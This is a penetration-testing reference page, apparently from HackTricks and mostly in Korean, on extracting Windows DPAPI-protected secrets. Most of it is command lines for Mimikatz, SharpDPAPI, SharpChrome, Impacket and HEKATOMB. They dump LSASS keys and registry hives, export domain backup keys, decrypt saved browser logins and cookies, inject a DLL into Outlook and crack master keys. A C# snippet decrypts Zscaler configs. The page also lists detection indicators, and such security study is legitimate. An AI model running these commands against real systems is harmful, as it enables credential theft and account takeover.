# DPAPI - 암호 추출

{{#include ../../banners/hacktricks-training.md}}



## DPAPI란

The Data Protection API (DPAPI)는 주로 Windows 운영체제에서 **비대칭 개인 키의 대칭 암호화**에 사용되며, 사용자 또는 시스템의 비밀을 엔트로피의 주요 원천으로 활용합니다. 이 방식은 개발자가 암호화 키를 직접 보호할 필요 없이, 사용자의 로그인 비밀에서 파생된 키(또는 시스템 암호화의 경우 시스템의 도메인 인증 비밀)를 사용해 데이터를 암호화할 수 있도록 하여 암호화를 단순화합니다.

DPAPI를 사용하는 가장 일반적인 방법은 **`CryptProtectData`와 `CryptUnprotectData`** 함수로, 이 함수들은 현재 로그인된 세션의 프로세스를 이용해 애플리케이션이 데이터를 안전하게 암호화하고 복호화할 수 있게 합니다. 즉, 암호화된 데이터는 그것을 암호화한 동일한 사용자나 시스템에서만 복호화할 수 있습니다.

또한 이 함수들은 암호화와 복호화 중에 함께 사용되는 **`entropy` 파라미터**도 허용하므로, 이 파라미터를 사용해 암호화된 것을 복호화하려면 암호화 시 사용된 것과 동일한 entropy 값을 제공해야 합니다.

### 사용자 키 생성

DPAPI는 각 사용자에 대해 자격 증명에 기반한 고유 키(이하 **`pre-key`**)를 생성합니다. 이 키는 사용자의 비밀번호 및 기타 요소에서 파생되며, 알고리즘은 사용자 유형에 따라 다르지만 최종적으로는 SHA1을 사용합니다. 예를 들어 도메인 사용자에 대해서는 **사용자의 NTLM 해시에 의존**합니다.

이 점이 특히 중요합니다. 공격자가 사용자의 패스워드 해시를 얻을 수 있다면 그들은:

- **DPAPI로 암호화된 모든 데이터를 복호화할 수 있습니다** — 해당 사용자의 키로, 별도의 API 호출 없이
- **오프라인에서 패스워드를 크래킹**하여 유효한 DPAPI 키를 생성하려 시도할 수 있습니다

또한 사용자가 DPAPI로 데이터를 암호화할 때마다 새로운 **master key**가 생성됩니다. 이 마스터 키가 실제로 데이터를 암호화하는 데 사용됩니다. 각 마스터 키에는 이를 식별하는 **GUID**(전역 고유 식별자)가 부여됩니다.

마스터 키는 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 디렉터리에 저장되며, 여기서 `{SID}`는 해당 사용자의 Security Identifier입니다. 마스터 키는 사용자의 **`pre-key`**로 암호화되어 저장되며 복구를 위해 **domain backup key**로도 암호화되어 저장됩니다(즉, 동일한 키가 서로 다른 두 경로로 두 번 암호화되어 저장됩니다).

마스터 키를 암호화하는 데 사용된 **도메인 키(domain key)**는 도메인 컨트롤러에 있으며 변경되지 않습니다. 따라서 공격자가 도메인 컨트롤러에 접근할 수 있다면 도메인 백업 키를 가져와 도메인 내 모든 사용자의 마스터 키를 복호화할 수 있습니다.

암호화된 블롭(blob)의 헤더에는 데이터를 암호화하는 데 사용된 **마스터 키의 GUID**가 포함되어 있습니다.

> [!TIP]
> DPAPI로 암호화된 블롭은 **`01 00 00 00`**으로 시작합니다

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System 키 생성

이 키는 머신이 데이터를 암호화하는 데 사용됩니다. 이는 **DPAPI_SYSTEM LSA secret**을 기반으로 하며, 오직 SYSTEM user만 접근할 수 있는 특별한 키입니다. 이 키는 머신 수준 자격증명이나 시스템 전체 비밀처럼 시스템 자체에서 접근해야 하는 데이터를 암호화하는 데 사용됩니다.

Note that these keys **don't have a domain backup** so they are only accesisble locally:

- **Mimikatz**는 LSA secrets를 덤프하여 다음 명령으로 접근할 수 있습니다: `mimikatz lsadump::secrets`
- 비밀은 레지스트리에 저장되어 있으므로, 관리자는 **DACL 권한을 수정하여 접근할 수 있습니다**. 레지스트리 경로는: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- 레지스트리 hives에서의 오프라인 추출도 가능합니다. 예를 들어, 대상에서 관리자 권한으로 hives를 저장하고 exfiltrate하면 됩니다:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
그런 다음 분석용 머신에서 하이브(hives)로부터 DPAPI_SYSTEM LSA secret을 복구하여 머신 스코프 블롭(예약된 작업 비밀번호, 서비스 자격 증명, Wi‑Fi 프로필 등)을 복호화하세요:
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### DPAPI로 보호되는 데이터

다음은 DPAPI로 보호되는 개인 데이터입니다:

- Windows creds
- Internet Explorer 및 Google Chrome의 비밀번호 및 자동 완성 데이터
- Outlook 및 Windows Mail과 같은 애플리케이션의 이메일 및 내부 FTP 계정 비밀번호
- 암호화 키를 포함한 공유 폴더, 리소스, 무선 네트워크 및 Windows Vault의 비밀번호
- 원격 데스크톱 연결 비밀번호, .NET Passport 비밀번호 및 다양한 암호화/인증 용도의 개인 키
- Credential Manager가 관리하는 네트워크 비밀번호 및 CryptProtectData를 사용하는 애플리케이션(예: Skype, MSN messenger 등)에 저장된 개인 데이터
- 레지스트리 내의 암호화된 blob
- ...

시스템으로 보호되는 데이터에는 다음이 포함됩니다:
- Wifi 비밀번호
- 예약된 작업 비밀번호
- ...

### 마스터 키 추출 옵션

- 사용자가 도메인 관리자 권한을 가지고 있으면, 도메인 내 모든 사용자 마스터 키를 복호화하기 위해 **domain backup key**에 접근할 수 있습니다:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- 로컬 관리자 권한이 있으면, 연결된 모든 사용자의 DPAPI 마스터 키와 SYSTEM 키를 추출하기 위해 **LSASS 메모리에 접근할 수 있습니다**.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- 사용자가 로컬 관리자 권한을 가지고 있다면, **DPAPI_SYSTEM LSA secret**에 접근하여 머신 마스터 키를 복호화할 수 있습니다:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- 사용자의 password 또는 hash NTLM을 알고 있다면, 사용자의 **master keys를 직접 decrypt할 수 있습니다**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- 사용자 세션으로 접속해 있다면 DC에 **backup key to decrypt the master keys using RPC**를 요청할 수 있습니다. 로컬 admin이고 사용자가 로그인해 있다면, 이를 위해 **steal his session token**을 탈취할 수 있습니다:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault 목록
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI 암호화된 데이터에 접근

### DPAPI 암호화된 데이터 찾기

일반 사용자 **보호된 파일**은 다음 위치에 있습니다:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 위의 경로에서 `\Roaming\`을 `\Local\`로 변경한 것도 확인하세요.

열거 예시:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)은 파일 시스템, 레지스트리 및 B64 blobs에서 DPAPI로 암호화된 blobs를 찾을 수 있습니다:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Note that [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (from the same repo) can be used to decrypt using DPAPI sensitive data like cookies.

#### Chromium/Edge/Electron quick recipes (SharpChrome)

- 현재 사용자, 저장된 로그인/쿠키의 대화형 복호화(사용자 컨텍스트로 실행될 때 추가 키가 사용자의 Credential Manager에서 해결되므로 Chrome 127+의 app-bound cookies에서도 작동):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- 파일만 있을 때의 오프라인 분석. 먼저 프로필의 "Local State"에서 AES state key를 추출한 다음 cookie DB를 복호화하는 데 사용하세요:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- 도메인 전역/원격 triage — DPAPI domain backup key (PVK)와 target host의 admin 권한을 보유한 경우:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- 사용자의 DPAPI prekey/credkey (from LSASS)를 가지고 있으면, password cracking을 건너뛰고 프로필 데이터를 직접 복호화할 수 있습니다:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
참고
- 최신 Chrome/Edge 빌드는 특정 쿠키를 "App-Bound" 암호화로 저장할 수 있습니다. 해당 특정 쿠키들은 추가적인 app-bound 키 없이는 오프라인에서 복호화할 수 없습니다; 키를 자동으로 가져오려면 대상 사용자 컨텍스트에서 SharpChrome을 실행하세요. 자세한 내용은 아래에 참조된 Chrome 보안 블로그 게시물을 확인하세요.

### 액세스 키 및 데이터

- **Use SharpDPAPI** — 현재 세션의 DPAPI 암호화된 파일에서 자격 증명을 가져옵니다:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **credentials 정보 가져오기** — 예: 암호화된 데이터와 guidMasterKey
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

RPC를 사용하여 **domain backup key**를 요청하는 사용자의 masterkey를 복호화:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** 도구는 마스터키 복호화를 위해 다음 인자들도 지원합니다( `/rpc` 로 도메인 백업 키를 가져올 수 있고, `/password` 로 평문 비밀번호를 사용할 수 있으며, `/pvk` 로 DPAPI 도메인 개인 키 파일을 지정할 수 있다는 점에 주의하세요...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **masterkey를 사용해 data를 복호화(Decrypt)**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
The **SharpDPAPI** 도구는 또한 `credentials|vaults|rdg|keepass|triage|blob|ps` 복호화를 위해 다음 인자들을 지원합니다 (예: `/rpc`을 사용해 도메인의 백업 키를 얻거나, `/password`로 평문 비밀번호를 사용하거나, `/pvk`로 DPAPI 도메인 개인 키 파일을 지정하거나, `/unprotect`로 현재 사용자의 세션을 사용하도록 하는 등...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkey를 직접 사용하기 (비밀번호 불필요)

LSASS를 덤프할 수 있다면, Mimikatz는 종종 per-logon DPAPI key를 노출하여 평문 비밀번호를 알지 못해도 사용자의 masterkeys를 복호화하는 데 사용할 수 있습니다. 이 값을 도구에 직접 전달하세요:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- **현재 사용자 세션**을 사용하여 일부 데이터를 복호화:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Impacket dpapi.py를 사용한 오프라인 복호화

피해자 사용자의 SID와 비밀번호(또는 NT hash)를 가지고 있다면, Impacket의 dpapi.py를 사용해 DPAPI masterkeys와 Credential Manager blobs를 완전히 오프라인에서 복호화할 수 있습니다.

- 디스크에서 아티팩트를 식별:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- 파일 전송 툴이 불안정하면, 호스트에서 파일을 base64로 인코딩한 후 출력물을 복사하세요:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- 사용자의 SID 및 password/hash로 masterkey를 복호화한다:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- 복호화된 masterkey를 사용하여 credential blob을 복호화합니다:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
이 워크플로우는 Windows Credential Manager를 사용하는 앱에 의해 저장된 도메인 자격증명(예: 관리자 계정 `*_adm` 등)을 종종 복구합니다.

---

### 선택적 Entropy ("Third-party entropy") 처리

일부 애플리케이션은 `CryptProtectData`에 추가 **entropy** 값을 전달합니다. 이 값 없이는 올바른 masterkey를 알고 있어도 blob을 복호화할 수 없습니다. 따라서 Microsoft Outlook, 일부 VPN 클라이언트 등 이 방식으로 보호된 자격증명을 대상으로 할 때에는 엔트로피 확보가 필수적입니다.

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022)는 타깃 프로세스 내부의 DPAPI 함수를 후킹하여 제공되는 모든 선택적 **entropy**를 투명하게 기록하는 user-mode DLL입니다. `outlook.exe`나 `vpnclient.exe` 같은 프로세스에 대해 **DLL-injection** 모드로 EntropyCapture를 실행하면 각 entropy 버퍼를 호출한 프로세스 및 blob에 매핑한 파일을 출력합니다. 캡처된 entropy는 이후 **SharpDPAPI** (`/entropy:`) 또는 **Mimikatz** (`/entropy:<file>`)에 제공되어 데이터를 복호화하는 데 사용될 수 있습니다.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft는 Windows 10 v1607 (2016)부터 **context 3** masterkey 포맷을 도입했습니다. `hashcat` v6.2.6 (December 2023)은 해시 모드 **22100** (DPAPI masterkey v1 context ), **22101** (context 1) 및 **22102** (context 3)을 추가하여 masterkey 파일에서 사용자 비밀번호를 GPU로 가속화해 직접 크래킹할 수 있게 했습니다. 따라서 공격자는 대상 시스템과 상호작용하지 않고도 워드리스트 또는 brute-force 공격을 수행할 수 있습니다.

`DPAPISnoop` (2024)은 이 과정을 자동화합니다:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
이 도구는 Credential 및 Vault blobs를 파싱하고, 크랙된 키로 복호화하여 평문 비밀번호를 추출할 수도 있습니다.


### 다른 머신의 데이터에 접근

In **SharpDPAPI and SharpChrome**에서는 **`/server:HOST`** 옵션을 지정해 원격 머신의 데이터를 가져올 수 있습니다. 물론 해당 머신에 접근할 수 있어야 하며, 다음 예에서는 **domain backup encryption key가 알려져 있다고 가정합니다**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## 기타 도구

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB)는 LDAP 디렉터리에서 모든 사용자와 컴퓨터를 추출하고 RPC를 통해 도메인 컨트롤러 백업 키를 추출하는 작업을 자동화하는 도구입니다. 스크립트는 이후 모든 컴퓨터의 IP 주소를 확인하고 smbclient를 통해 모든 컴퓨터에서 모든 사용자의 DPAPI 블롭을 가져와 도메인 백업 키로 모든 것을 복호화합니다.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP에서 추출한 컴퓨터 목록으로, 알지 못했던 서브네트워크까지 모두 찾을 수 있습니다!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI)는 DPAPI로 보호된 비밀을 자동으로 덤프할 수 있습니다. 2.x 릴리스에서는 다음을 도입했습니다:

* 수백 대 호스트로부터 블롭을 병렬 수집
* **context 3** masterkeys 파싱 및 Hashcat 자동 크래킹 통합
* Chrome "App-Bound" 암호화된 쿠키 지원(다음 섹션 참조)
* 엔드포인트를 반복 폴링하고 새로 생성된 블롭의 차이를 확인하는 새로운 **`--snapshot`** 모드

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop)는 masterkey/credential/vault 파일을 파싱하는 C# 도구로, Hashcat/JtR 형식으로 출력하고 선택적으로 자동으로 크래킹을 호출할 수 있습니다. Windows 11 24H1까지의 머신 및 사용자 masterkey 포맷을 완벽히 지원합니다.


## 일반적인 탐지 지표

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 및 기타 DPAPI 관련 디렉터리의 파일 접근.
- 특히 **C$** 또는 **ADMIN$** 같은 네트워크 공유에서의 접근.
- LSASS 메모리에 접근하거나 masterkeys를 덤프하기 위해 **Mimikatz**, **SharpDPAPI** 또는 유사 도구를 사용하는 행위.
- 이벤트 **4662**: *An operation was performed on an object* – **`BCKUPKEY`** 객체 접근과 연관될 수 있음.
- 프로세스가 *SeTrustedCredManAccessPrivilege*(Credential Manager)를 요청할 때 발생하는 이벤트 **4673/4674**.

---
### 2023-2025 취약점 및 생태계 변화

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (2023년 11월). 네트워크 접근이 가능한 공격자가 도메인 멤버를 속여 악성 DPAPI 백업 키를 가져오게 할 수 있어 사용자 masterkeys를 복호화할 수 있었습니다. 2023년 11월 누적 업데이트에서 패치되었으므로, 관리자는 DC와 워크스테이션이 최신 패치가 적용되었는지 확인해야 합니다.
* **Chrome 127 “App-Bound” cookie encryption** (2024년 7월)은 기존의 DPAPI 전용 보호를 대체하여 추가 키를 사용자 **Credential Manager**에 저장합니다. 오프라인에서 쿠키를 복호화하려면 이제 DPAPI masterkey와 **GCM-wrapped app-bound key** 둘 다 필요합니다. SharpChrome v2.3 및 DonPAPI 2.x는 사용자 컨텍스트로 실행될 때 추가 키를 복구할 수 있습니다.


### 사례 연구: Zscaler Client Connector – SID에서 파생된 커스텀 엔트로피

Zscaler Client Connector는 `C:\ProgramData\Zscaler` 아래에 여러 구성 파일을 저장합니다(예: `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). 각 파일은 **DPAPI (Machine scope)**로 암호화되지만 벤더는 디스크에 저장하는 대신 *런타임에 계산되는* **custom entropy**를 제공합니다.

엔트로피는 다음 두 요소에서 재구성됩니다:

1. `ZSACredentialProvider.dll`에 내장된 하드코딩된 비밀.
2. 구성에 속한 Windows 계정의 **SID**.

DLL에 구현된 알고리즘은 다음과 동일합니다:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
비밀이 디스크에서 읽을 수 있는 DLL에 내장되어 있기 때문에, **SYSTEM 권한을 가진 모든 로컬 공격자는 모든 SID에 대한 엔트로피를 재생성하고** 오프라인에서 블롭을 복호화할 수 있습니다:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
복호화하면 모든 **device posture check** 및 해당 예상 값이 포함된 완전한 JSON 구성이 반환됩니다 — 클라이언트 측 우회 시도에 매우 유용한 정보입니다.

> 팁: 다른 암호화된 아티팩트 (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`)는 DPAPI **without** entropy (`16` zero bytes)로 보호되어 있습니다. 따라서 SYSTEM 권한을 획득하면 `ProtectedData.Unprotect`로 직접 복호화할 수 있습니다.

## 참고자료

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
